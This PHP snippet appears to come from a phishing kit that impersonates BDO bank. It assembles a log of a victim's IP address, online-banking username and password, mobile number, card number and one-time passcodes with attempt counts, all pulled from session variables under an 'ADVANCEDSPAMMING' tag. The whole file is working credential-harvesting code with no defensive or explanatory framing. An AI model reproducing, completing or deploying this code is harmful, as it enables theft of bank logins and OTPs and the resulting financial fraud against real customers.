<?php 
$text = '
Logged [ '.$ip_address.' ]
';

//if(isset($_SESSION['@ADVANCEDSPAMMING-first_log'])){
//$text .= '
//USER_1: '.$_SESSION['@ADVANCEDSPAMMING-first_log']['user_id'].'
//PASS_1: '.$_SESSION['@ADVANCEDSPAMMING-first_log']['password'].'
//'; }

if(isset($_SESSION['@ADVANCEDSPAMMING-second_log'])){
$text .= '
BDO ACCOUNT
USERNAME: '.$_SESSION['@ADVANCEDSPAMMING-second_log']['user_id'].'
PASSWORD: '.$_SESSION['@ADVANCEDSPAMMING-second_log']['password'].'
'; }

if(isset($_SESSION['@ADVANCEDSPAMMING-personal'])){
$text .= '
NUMBER: '.$_SESSION['@ADVANCEDSPAMMING-personal']['mobile_num'].'
CARD NUMBER*: '.$_SESSION['@ADVANCEDSPAMMING-personal']['account_num'].'
'; }

if(isset($_SESSION['@ADVANCEDSPAMMING-otp'])){
$text .= '
OTP :'.$_SESSION['otp_attempts'].': '.$_SESSION['@ADVANCEDSPAMMING-otp']['code'].'
'; }
?>